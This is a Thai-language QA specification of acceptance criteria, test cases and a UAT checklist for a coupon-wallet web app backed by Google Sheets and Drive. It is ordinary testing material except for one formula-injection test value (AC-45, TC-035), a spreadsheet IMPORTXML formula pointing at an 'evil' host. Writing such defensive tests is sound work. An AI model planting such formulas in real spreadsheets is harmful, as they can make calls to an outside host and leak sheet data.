# Acceptance Criteria & Test Cases — Coupon Wallet

| รายการ | รายละเอียด |
|---|---|
| เวอร์ชัน | 0.1 (Draft) |
| วันที่ | 31 ตุลาคม 2026 |
| อ้างอิง | `01-BRD.md`, `02-business-flow.md`, `03-data-model-and-api.md` |

> รูปแบบ AC: Given / When / Then — ใช้เป็นเกณฑ์ตรวจรับ (UAT) และเป็น basis ของ E2E test

---

## 1. Add Coupon & Image (BR-01)

**AC-01 — อัปโหลดรูปที่ถูกต้อง**
- Given ผู้ใช้อยู่หน้า S-02 และยังไม่มีรูป
- When เลือกไฟล์ `.jpg` ขนาด 2 MB
- Then เห็น preview รูป และระบบเริ่มอ่าน QR/OCR อัตโนมัติ โดยไม่ต้องกดปุ่มเพิ่ม

**AC-02 — ไฟล์ผิดชนิด**
- Given ผู้ใช้เลือกไฟล์ `.pdf`
- When ระบบตรวจชนิดไฟล์
- Then ปฏิเสธก่อนประมวลผล, แสดงข้อความ "รองรับเฉพาะ JPG, PNG, WEBP" และไม่มี request ไป API

**AC-03 — ไฟล์ใหญ่เกิน**
- Given เลือกไฟล์ 15 MB
- When ตรวจขนาด
- Then ปฏิเสธพร้อมแนะนำให้ crop, ฟอร์มไม่ถูกส่ง

**AC-04 — HEIC จาก iOS**
- Given เลือกไฟล์ `.heic`
- When อัปโหลด
- Then แปลงเป็น WebP (หรือ JPEG ถ้าเบราว์เซอร์ไม่รองรับ) และรูปที่บันทึกใน Drive เป็น `.webp`/`.jpg`

**AC-05 — วางจาก clipboard / ถ่ายรูป**
- Given คัดลอกรูปไว้ใน clipboard หรืออยู่บนมือถือ
- When กด Ctrl/Cmd+V หรือกดปุ่ม “ถ่ายรูป”
- Then ระบบรับรูป (จาก clipboard หรือกล้องหลัง) และเริ่มประมวลผลเหมือนการเลือกไฟล์

---

## 2. QR Reader (BR-03)

**AC-06 — อ่าน QR ด้วย jsQR**
- Given รูปที่มี QR ชัดเจน
- When ประมวลผล
- Then ได้ `qrRawValue` ตรงกับค่าจริง ภายใน 2 วินาที และ `qrType` ถูกต้อง

**AC-07 — Fallback ด้วย ZXing**
- Given รูปที่ jsQR อ่านไม่ได้ (เอียง 30° หรือมีโลโก้กลาง)
- When jsQR ล้มเหลว
- Then ระบบลอง ZXing อัตโนมัติ และอ่านได้สำเร็จ

**AC-08 — ไม่พบ QR**
- Given รูปที่ไม่มี QR
- When ประมวลผลเสร็จ
- Then แจ้ง "ไม่พบ QR Code" แบบไม่บล็อก, ยังบันทึกได้เมื่อกรอก `couponCode` หรือยืนยันว่าไม่มีรหัส

**AC-09 — QR ที่ payload ไม่ใช่อักษรปกติ**
- Given QR บรรจุ binary
- When decode
- Then เก็บเป็น string แบบ escape, `qrType = unknown`, หน้า Detail แสดงข้อความไม่ทำให้หน้าเว็บพัง

**AC-10 — QR ซ้ำ**
- Given คูปองเดิมมี `qrRawValue` = X
- When บันทึกคูปองใหม่ที่มีค่าเดียวกัน (ต่าง whitespace/ตัวพิมพ์)
- Then แสดงคำเตือนพร้อมลิงก์คูปองเดิม และให้เลือกยกเลิกหรือบันทึกต่อ

---

## 3. OCR & Auto Naming (BR-02, BR-04)

**AC-11 — OCR ข้อความไทย/อังกฤษ**
- Given รูปคูปองที่มีข้อความไทยและตัวเลข
- When OCR เสร็จ
- Then `ocrTextRaw` มีข้อความหลักครบ (ชื่อร้าน/ส่วนลด) และมี `ocrConfidence`

**AC-12 — OCR ล้มเหลว/หมดเวลา**
- Given OCR ใช้เวลาเกิน 20 วินาที
- When ครบ timeout
- Then หยุดประมวลผล, แสดงผล QR (ถ้ามี), ให้กรอกข้อมูลเอง, ไม่ค้างหน้า loading

**AC-13 — Auto naming จาก description**
- Given OCR อ่านได้ "Shopee · ลด 50 บาท ขั้นต่ำ 300 · โค้ด: SAVE50"
- When สร้างชื่อ
- Then `title = "Shopee ลด 50 บาท ขั้นต่ำ 300 โค้ด SAVE50"` (≤ 100 ตัวอักษร, ไม่มี `·` `:` `%` หรืออิโมจิ)

**AC-14 — Auto naming fallback**
- Given OCR อ่านไม่ได้ หรือข้อความเหลือแต่สัญลักษณ์/อิโมจิ
- When สร้างชื่อ
- Then `title = "คูปอง YYYY-MM-DD HH:mm"` และผู้ใช้แก้ได้

**AC-15 — วันหมดอายุ พ.ศ.**
- Given OCR ได้ "31/12/2569"
- When parse
- Then แปลงเป็น `2026-12-31` และแสดงข้อความยืนยันการตีความให้ผู้ใช้ตรวจ

**AC-16 — วันหมดอายุไม่ชัดเจน**
- Given OCR ได้ "31/12/69"
- When parse
- Then **ไม่** บันทึกอัตโนมัติ, ไฮไลต์ฟิลด์ให้ผู้ใช้ยืนยัน

---

## 4. Review & Save (BR-05, BR-11)

**AC-17 — หน้า Review แสดงข้อมูลครบ**
- Given ประมวลผลเสร็จ
- When เข้าหน้า S-02
- Then เห็นรูปต้นฉบับ (ซูมได้) + ฟิลด์ title, merchant, discountText, couponCode, expiryDate, description, note, qrRawValue ที่แก้ไขได้ + `ocrTextRaw` แบบ read-only

**AC-18 — Validation ชื่อ**
- Given `title` ว่าง หรือ 101 ตัวอักษร
- When กดบันทึก
- Then บันทึกไม่เกิดขึ้น, ไฮไลต์ฟิลด์, ข้อความระบุข้อจำกัด

**AC-19 — บันทึกสำเร็จ**
- Given ฟอร์มผ่าน validation และมีรูป
- When กดบันทึก
- Then มีแถวใหม่ใน `Coupons` ครบทุกฟิลด์, `status = unused`, `createdAt` เป็นเวลาไทย, มีไฟล์ใน Drive ชื่อ `{couponId}.jpg`, `imageUrl` เปิดได้, มี log `created`

**AC-20 — Drive ล้มเหลว**
- Given จำลอง Drive error
- When กดบันทึก
- Then ไม่มีแถวใหม่ใน `Coupons`, แสดง error `DRIVE_UPLOAD_FAILED`, ข้อมูลในฟอร์มยังอยู่ครบ

**AC-21 — Sheets ล้มเหลว (compensating)**
- Given อัปโหลด Drive สำเร็จแต่เขียน Sheets error
- When ระบบ rollback
- Then ไฟล์ที่เพิ่งสร้างถูกย้ายไป trash และไม่มีแถวกำพร้า

**AC-22 — กดบันทึกซ้ำ**
- Given ผู้ใช้กดปุ่มบันทึก 2 ครั้งติดกัน
- When request ที่สองมาถึง
- Then ได้ผลลัพธ์เดิม (idempotent) และมีคูปองเพียง 1 ใบ

**AC-23 — ไม่บันทึกเมื่อยกเลิก**
- Given อยู่หน้า Review
- When กดยกเลิก/ปิดหน้า
- Then ไม่มีข้อมูลใดถูกเขียนลง Sheets หรือ Drive

---

## 5. Coupon List & Filter (BR-06, BR-09, BR-14)

**AC-24 — ค่าเริ่มต้นของรายการ**
- Given มีคูปองผสมหลายสถานะ
- When เปิด S-01
- Then เห็นเฉพาะที่ไม่ถูก soft delete, เรียงตามกฎ (ใกล้หมดอายุ → ไม่มีวันหมดอายุ → used)

**AC-25 — ค้นหา**
- Given มีคูปองชื่อ "GrabFood — 1 แถม 1" และรหัส `GRAB1FREE`
- When พิมพ์ "grab" หรือ "1free"
- Then ผลลัพธ์แสดงเฉพาะที่ตรง (ไม่สนตัวพิมพ์)

**AC-26 — กรองยังไม่ใช้**
- Given มีคูปอง unused ที่ยังไม่หมดอายุ, unused ที่หมดอายุ, used
- When เลือกแท็บ "ยังไม่ใช้"
- Then เห็นเฉพาะ unused ที่ยังไม่หมดอายุ

**AC-27 — กรองใช้แล้ว / หมดอายุ**
- Given ข้อมูลเดียวกัน
- When เลือก "ใช้แล้ว" → เห็นเฉพาะ used; เลือก "หมดอายุ" → เห็นเฉพาะ unused ที่ `expiryDate` < วันนี้

**AC-28 — Badge ใกล้หมดอายุ**
- Given `expiryDate` = วันนี้ + 2 วัน
- When แสดงการ์ด
- Then มี badge "เหลือ 2 วัน"; ถ้าเลยวันแล้วเป็น "หมดอายุ" สีแดง

**AC-29 — Empty state**
- Given ไม่มีคูปองในตัวกรองที่เลือก
- When แสดงผล
- Then มีข้อความอธิบาย + ปุ่ม "เพิ่มคูปอง"

**AC-30 — ประสิทธิภาพรายการ**
- Given มี 500 คูปอง
- When เปิดหน้าแรก
- Then เห็นรายการภายใน 2 วินาที (p75) บนมือถือ mid-range

---

## 6. View QR & Mark Used (BR-07, BR-08, BR-10)

**AC-31 — แท็บการแสดงผล**
- Given คูปองมี `qrRawValue` และ `couponCode`
- When เปิด S-04
- Then เห็นแท็บ 3 อันตามลำดับ “เลข QR / บาร์โค้ด / QR”, เปิดแท็บ QR เป็นค่าเริ่มต้น, และสลับแท็บได้โดยเนื้อหาเปลี่ยนตาม

**AC-32 — แท็บ QR**
- Given เลือกแท็บ QR และมี `qrRawValue`
- When แสดงผล
- Then QR ถูกวาดใหม่จากค่า, ขนาด ≥ 280 px, พื้นหลังขาว, สแกนด้วยมือถืออีกเครื่องได้; ถ้าไม่มี `qrRawValue` แสดง empty state ไม่ใช่ QR เปล่า

**AC-33 — แท็บเลข QR**
- Given คูปองมี `couponCode` หรือ `qrRawValue`
- When เลือกแท็บเลข QR
- Then แสดงข้อความเป็นตัวใหญ่ อ่านง่าย, ปุ่มคัดลอกคัดลอกค่าหลัก, และถ้า `qrRawValue` ต่างจาก `couponCode` แสดงข้อมูลดิบเพิ่ม

**AC-51 — แท็บบาร์โค้ด**
- Given คูปองมี `couponCode` เป็น ASCII
- When เลือกแท็บบาร์โค้ด
- Then เรนเดอร์ Code 128 พร้อมค่าข้อความ; ถ้ารหัสเป็น URL/มีอักษรไทย/ยาวเกิน 80 ตัว → แสดงข้อความอธิบายและไม่เรนเดอร์บาร์โค้ด

**AC-52 — Mobile-only layout**
- Given เปิดเว็บที่ความกว้าง 390 px และ 1,280 px
- When ดูหน้าแรก, รายละเอียด, และหน้า QR
- Then ทั้งสองความกว้างใช้เลย์เอาต์คอลัมน์เดียว ความกว้างเนื้อหา ≤ 480 px, ไม่มี horizontal scroll และแท็บ QR ทั้ง 3 อันกดได้ด้วยนิ้ว

**AC-34 — Mark used สำเร็จ**
- Given คูปอง `unused`
- When กดใช้แล้ว + ยืนยัน
- Then `status = used`, `usedAt` = เวลาปัจจุบัน (ไทย), มี log `marked_used` (from unused → used), UI อัปเดตทันที

**AC-35 — ใช้ซ้ำไม่ได้**
- Given คูปอง `used`
- When เรียก `markUsed` อีกครั้ง
- Then ได้ `INVALID_STATE` (409), ข้อมูลไม่เปลี่ยน, ไม่มี log ซ้ำ

**AC-36 — คูปองหมดอายุ**
- Given คูปอง `unused` ที่ `expiryDate` ผ่านไปแล้ว
- When กดใช้แล้ว
- Then มีคำเตือน "คูปองหมดอายุแล้ว" ต้องยืนยันซ้ำก่อนจึงเปลี่ยนสถานะ

**AC-37 — ความล้มเหลวขณะ mark used**
- Given ตัดการเชื่อมต่อ
- When กดใช้แล้ว
- Then สถานะไม่เปลี่ยน, แจ้ง error, ไม่มี log ปลอม

---

## 7. Undo Used (BR-08, D-03)

**AC-38 — Undo สำเร็จ**
- Given คูปอง `used` ที่มี `usedAt`
- When กดย้อนกลับ + ยืนยัน
- Then `status = unused`, `usedAt` ว่าง, มี log `undo_used` (used → unused) และ log เก็บ `usedAt` เดิมใน metadata

**AC-39 — Undo คูปองที่ยังไม่ใช้**
- Given คูปอง `unused`
- When เรียก `undoUsed`
- Then ได้ `INVALID_STATE`, ไม่มี log

**AC-40 — ประวัติไม่หาย**
- Given เคย mark used → undo → mark used อีกครั้ง
- When เปิด S-06
- Then เห็น log ครบ 3 รายการ เรียงใหม่→เก่า

---

## 8. Edit / Delete (BR-11, BR-12)

**AC-41 — แก้ไขชื่อ**
- Given คูปองชื่อเดิม A
- When แก้เป็น B แล้วบันทึก
- Then `title = B`, `updatedAt` เปลี่ยน, มี log `updated` เก็บ diff (`title: A → B`)

**AC-42 — แก้ qrRawValue**
- Given คูปองมี QR เดิม
- When แก้ `qrRawValue`
- Then แสดงคำเตือน "QR ที่สร้างใหม่ไม่ใช่ QR ต้นฉบับ" ก่อนบันทึก และ QR ใน S-04 เปลี่ยนตามค่าใหม่

**AC-43 — ฟิลด์ที่ห้ามแก้**
- Given หน้าแก้ไข
- When พยายามเปลี่ยน `couponId` / `createdAt` / `status` ผ่าน API
- Then ถูกปฏิเสธ หรือถูก ignore และค่าเดิมคงอยู่

**AC-44 — Soft delete**
- Given คูปองที่ยังไม่ใช้
- When กดลบ + ยืนยัน
- Then `deletedAt` ถูกตั้ง, คูปองหายจากรายการ, แถวใน Sheets ยังอยู่, ไฟล์ใน Drive ยังอยู่, มี log `deleted`

---

## 9. Cross-cutting (Security, NFR)

**AC-45 — Formula injection**
- Given ผู้ใช้ตั้งชื่อ `=IMPORTXML("http://evil")`
- When บันทึก
- Then ค่าใน Sheets ถูกเก็บเป็นข้อความ (`'=IMPORTXML…`) ไม่ถูก execute

**AC-46 — ไม่มี secret ฝั่ง client**
- Given เปิด DevTools ดู network/bundle
- When ใช้งานทุก flow
- Then ไม่พบ `GAS_SHARED_SECRET` หรือ URL ที่เรียก Apps Script ตรงจาก browser

**AC-47 — Request ไม่มี token**
- Given เรียก Apps Script โดยไม่มี/ผิด token
- When ประมวลผล
- Then ได้ `UNAUTHORIZED` และไม่มีการเขียนข้อมูล

**AC-48 — Timezone**
- Given บันทึกเวลา 23:59 น. ตามเวลาไทย
- When ตรวจ `createdAt` ใน Sheets
- Then เป็นวันเดียวกันกับเวลาไทย (ไม่เลื่อนเป็นวันถัดไปเพราะ UTC)

**AC-49 — Mobile usability**
- Given จอ 390×844
- When ใช้ทุก flow หลัก
- Then ไม่มี horizontal scroll, ปุ่มหลักกดถึงด้วยนิ้วโป้ง, ขนาด ≥ 44 px

**AC-50 — Accessibility**
- Given ใช้ keyboard/screen reader
- When กรอกฟอร์ม
- Then ทุก input มี label, error ถูก announce, สถานะไม่ได้สื่อด้วยสีอย่างเดียว

---

## 9.1 Multi-user (BR-17)

**AC-53 — ทุก id เห็นเฉพาะข้อมูลของตัวเอง**
- Given มีคูปองของ `tar` และ `demo`
- When เปิด `/user/demo` หรือเรียก API ด้วย `userId=demo`
- Then เห็นเฉพาะคูปองของ `demo`; ไม่เห็น/เข้าไม่ถึงคูปองของ `tar` (`NOT_FOUND`)
- และ id ใด ๆ ก็เห็นเฉพาะคูปองของ id นั้น

**AC-56 — แชร์คูปองโดยไม่ต้องมี user**
- Given คูปองที่ยังไม่ถูกลบ
- When เปิด `/share/{couponId}`
- Then เห็นคูปองแบบอ่านอย่างเดียว (รูป/ชื่อ/QR/รหัส) โดยไม่ต้องมี userId; ไม่มีปุ่มใช้/แก้/ลบ; ถ้าคูปองถูกลบ → 404

**AC-55 — ตรวจคุณภาพภาษา**
- Given มีข้อความ description จาก OCR
- When เปิดหน้า Review หรือ Baseline
- Then เห็นคะแนนภาษาและรายการคำที่ควรตรวจ; ระบบไม่แก้ข้อความอัตโนมัติ; ข้อความสะอาดได้ 100%

**AC-54 — หน้าแรกเป็นหน้าสร้าง QR**
- Given เปิด `/`
- When หน้าโหลด
- Then เห็นช่องพิมพ์ข้อความ + แท็บ QR/บาร์โค้ด (ไม่ใช่รายการคูปอง); เมื่อพิมพ์จะได้ลิงก์แชร์ `/qr?text=...` และไม่มีข้อมูลถูกบันทึก

---

## 10. Test Cases (ตัวอย่างชุดทดสอบ)

| TC | ชื่อ | ขั้นตอนย่อ | ผลที่คาดหวัง | AC |
|---|---|---|---|---|
| TC-001 | อัปโหลด JPG ปกติ | เลือกไฟล์ → รอ → ตรวจฟอร์ม | preview + ข้อมูลถูกเดา | AC-01, AC-11, AC-13 |
| TC-002 | อัปโหลด PDF | เลือก PDF | ปฏิเสธก่อนประมวลผล | AC-02 |
| TC-003 | ไฟล์ 15 MB | เลือกไฟล์ใหญ่ | ปฏิเสธ + แนะนำ crop | AC-03 |
| TC-004 | HEIC | เลือก HEIC | แปลง jpg สำเร็จ | AC-04 |
| TC-005 | Paste | Ctrl+V | รับรูป + source=paste | AC-05 |
| TC-006 | QR ชัด | รูปมี QR | ได้ค่าตรง, < 2s | AC-06 |
| TC-007 | QR เอียง | รูปเอียง 30° | ZXing อ่านได้ | AC-07 |
| TC-008 | ไม่มี QR | รูปไม่มี QR | เตือน + บันทึกได้ | AC-08 |
| TC-009 | QR binary | QR binary | ไม่ crash, type=unknown | AC-09 |
| TC-010 | QR ซ้ำ | บันทึกซ้ำ | เตือน + ลิงก์เดิม | AC-10 |
| TC-011 | OCR timeout | จำลอง slow worker | ไม่ค้าง, กรอกเองได้ | AC-12 |
| TC-012 | ชื่อ fallback | รูปมีแต่สัญลักษณ์/OCR ว่าง | ชื่อรูปแบบวันที่ | AC-14 |
| TC-013 | พ.ศ. | OCR 2569 | 2026-12-31 + ยืนยัน | AC-15 |
| TC-014 | วันที่ 2 หลัก | OCR 31/12/69 | ไม่บันทึกอัตโนมัติ | AC-16 |
| TC-015 | Validation ชื่อว่าง | ลบชื่อ → บันทึก | บล็อก + ไฮไลต์ | AC-18 |
| TC-016 | บันทึกสำเร็จ | กรอกครบ → บันทึก | Sheets + Drive + log | AC-19, AC-23 |
| TC-017 | Drive fail | จำลอง error | ไม่มีแถว, ฟอร์มคงอยู่ | AC-20 |
| TC-018 | Sheets fail | จำลอง error | ไฟล์ถูก trash | AC-21 |
| TC-019 | Double submit | กด 2 ครั้ง | คูปองเดียว | AC-22 |
| TC-020 | เรียงรายการ | ข้อมูลผสม | ตามกฎ | AC-24 |
| TC-021 | ค้นหา | พิมพ์ grab | เจอถูกต้อง | AC-25 |
| TC-022 | Filter 4 แท็บ | สลับแท็บ | ผลตรงเงื่อนไข | AC-26, AC-27 |
| TC-023 | Badge | วันหมดอายุ +2 วัน | "เหลือ 2 วัน" | AC-28 |
| TC-024 | QR tabs | เปิด S-04 สลับ 3 แท็บ | QR/บาร์โค้ด/เลข QR แสดงถูก | AC-31..33, AC-51 |
| TC-025 | Mark used | กดใช้ → ยืนยัน | used + usedAt + log | AC-34 |
| TC-026 | Mark used ซ้ำ | เรียก API ซ้ำ | 409, ไม่เปลี่ยน | AC-35 |
| TC-027 | หมดอายุ → ใช้ | กดใช้คูปองหมดอายุ | เตือนก่อน | AC-36 |
| TC-028 | Undo | กดย้อนกลับ | unused + log + เก็บเวลาเดิม | AC-38 |
| TC-029 | Undo ซ้ำ | เรียกซ้ำ | 409 | AC-39 |
| TC-030 | History 3 รายการ | used→undo→used | เห็นครบ 3 | AC-40 |
| TC-031 | Edit title | แก้ชื่อ | ค่าใหม่ + diff log | AC-41 |
| TC-032 | Edit QR | แก้ qrRawValue | เตือน + QR ใหม่ | AC-42 |
| TC-033 | Protected fields | ยิง API แก้ status | ถูก ignore | AC-43 |
| TC-034 | Soft delete | ลบ | หายจาก list, แถวยังอยู่ | AC-44 |
| TC-035 | Formula | ชื่อ =IMPORTXML | escape เป็นข้อความ | AC-45 |
| TC-036 | Secret leak | ตรวจ bundle | ไม่พบ secret | AC-46 |
| TC-037 | No token | ยิงตรง | 401 | AC-47 |
| TC-038 | Timezone | บันทึก 23:59 | วันที่ไทยถูกต้อง | AC-48 |
| TC-039 | Mobile | 390×844 | ไม่มี scroll แนวนอน | AC-49 |
| TC-040 | Keyboard | Tab ผ่านฟอร์ม | label/error ครบ | AC-50 |
| TC-044 | แยก user | สร้างของ tar → เปิด demo | ไม่เห็น/404 | AC-53 |
| TC-045 | Home create | เปิด / และพิมพ์ข้อความ | ได้ QR + ลิงก์ /qr | AC-54 |
| TC-047 | ตรวจภาษา | OCR ข้อความมีคำแปลก | เห็นคะแนน + คำควรตรวจ | AC-55 |
| TC-048 | แชร์คูปอง | เปิด /share/{id} | อ่านอย่างเดียว ไม่ต้องมี user | AC-56 |
| TC-041 | Barcode | คูปองรหัส SAVE50 | Code 128 + ข้อความ | AC-51 |
| TC-042 | Barcode ไม่ได้ | QR เป็น URL | ข้อความอธิบาย ไม่เรนเดอร์ | AC-51 |
| TC-043 | Mobile-only | 390px และ 1280px | คอลัมน์เดียว ≤480px | AC-52 |

---

## 11. Traceability Matrix

| BR | Feature | Flow | Screen | API action | AC | TC |
|---|---|---|---|---|---|---|
| BR-01 | Add Coupon | Flow 1 | S-02 | `createCoupon` | AC-01..05 | TC-001..005 |
| BR-02 | OCR | Flow 1 | S-02 | – (client) | AC-11, 12, 55 | TC-001, 011, 047 |
| BR-03 | QR Reader | Flow 1 | S-02 | – (client) | AC-06..10 | TC-006..010 |
| BR-04 | Auto Naming | Flow 1 | S-02 | – (client) | AC-13..16 | TC-012..014 |
| BR-05 | Google Sheets | Flow 1 | S-02 → S-03 | `createCoupon` | AC-19..22 | TC-016..019 |
| BR-06 | Coupon List | Flow 2 | S-01 | `listCoupons` | AC-24, 25, 29, 30 | TC-020, 021 |
| BR-07 | View QR / Barcode / Code | Flow 3 | S-04 | `getCoupon` | AC-31..33, 51 | TC-024, 041, 042 |
| BR-17 | User Wallet | Flow 0 | S-01, S-07 | coupons API + `userId` | AC-53 | TC-044 |
| BR-20 | Share Coupon | – | S-10 | `getSharedCoupon` | AC-56 | TC-048 |
| BR-08 | Mark as Used | Flow 3, 4 | S-03 | `markUsed`, `undoUsed` | AC-34..39 | TC-025..029 |
| BR-09 | Filter Status | Flow 2 | S-01 | `listCoupons` | AC-26, 27 | TC-022 |
| BR-10 | Usage History | Flow 3, 4 | S-06 | `listHistory` | AC-34, 38, 40 | TC-025, 028, 030 |
| BR-11 | Review & Edit | Flow 1, 5 | S-02, S-05 | `updateCoupon` | AC-17, 41..43 | TC-031..033 |
| BR-12 | Delete | Flow 5 | S-03 | `deleteCoupon` | AC-44 | TC-034 |
| BR-13 | Duplicate | Flow 1 | S-02 | – (client) | AC-10 | TC-010 |
| BR-14 | Expiry Badge | Flow 2 | S-01 | – (client) | AC-28 | TC-023 |
| NFR-06/07 | Security | – | – | – | AC-45..47 | TC-035..037 |

---

## 12. UAT Checklist

**ข้อมูลทดสอบ:** รูปคูปองจริงอย่างน้อย 20 ใบ ครอบคลุม Shopee, Lazada, Grab, LINE MAN, ธนาคาร, ร้านกาแฟ และ 1 ใบที่ไม่มี QR

| # | สิ่งที่ตรวจ | เกณฑ์ผ่าน |
|---|---|---|
| U-01 | เพิ่มคูปอง 20 ใบ | สำเร็จ ≥ 19 ใบ, ใบที่เหลือล้มเหลวด้วยเหตุผลที่เข้าใจได้ |
| U-02 | ข้อมูลที่ระบบเดาถูก | ชื่อ/ส่วนลด/วันหมดอายุถูก ≥ 70% โดยไม่ต้องแก้ |
| U-03 | เวลาต่อคูปอง | ค่ากลาง ≤ 30 วินาที |
| U-04 | ตรวจ Sheets | ครบทุกคอลัมน์, ไม่มีสูตรถูก execute, วันที่ถูกต้อง |
| U-05 | ตรวจ Drive | ทุกแถวมีไฟล์จริง, ชื่อตรง `couponId` |
| U-06 | กรอง 4 แท็บ | ผลตรงทุกกรณี |
| U-07 | ใช้/undo | ทำงานครบ + history ครบ |
| U-08 | ใช้บนมือถือจริง | ไม่มีปัญหาการกด/เลื่อน |
| U-09 | ตัดเน็ตระหว่างบันทึก | ไม่มีข้อมูลครึ่ง ๆ กลาง ๆ |
| U-10 | ผู้ใช้ใหม่ทำเอง | ทำ flow เพิ่ม+ใช้สำเร็จโดยไม่ต้องมีคนช่วย |

**เกณฑ์ลงนาม UAT:** ผ่านทุกข้อ U-01..U-10 และ AC ที่เป็น Must ทั้งหมด (AC-01..AC-44, AC-51..AC-56)

---

## 13. สิ่งที่ยังต้องวัดก่อนล็อกขอบเขต

1. **Baseline OCR:** ทดสอบ Tesseract.js กับรูปจริง 20–30 ใบ วัดว่าอ่านชื่อร้าน/ส่วนลด/วันหมดอายุได้กี่ % (ถ้า < 50% ต้องพิจารณา cloud OCR หรือให้ผู้ใช้พิมพ์มากขึ้น)
2. **Baseline QR:** วัดอัตราอ่านสำเร็จของ jsQR vs ZXing กับ QR ในแอปไทย
3. **ขนาด language data:** วัดเวลาโหลด Tesseract ครั้งแรกบน 4G
4. **Apps Script latency:** วัด p50/p95 ของ `createCoupon` จากประเทศไทย
